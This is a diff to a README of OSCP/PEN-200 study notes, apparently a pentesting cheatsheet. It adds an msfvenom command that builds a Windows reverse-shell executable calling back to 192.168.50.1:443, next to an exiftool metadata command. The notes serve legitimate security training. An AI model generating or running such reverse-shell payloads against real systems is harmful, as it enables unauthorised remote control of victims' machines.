@@ -1,5 +1,10 @@
 # OSCP-Notes
 Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
+
+Payload Generator msfvenom:
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
+    
 file metadata analyzer:
 
     exiftool -a -u <file.name>
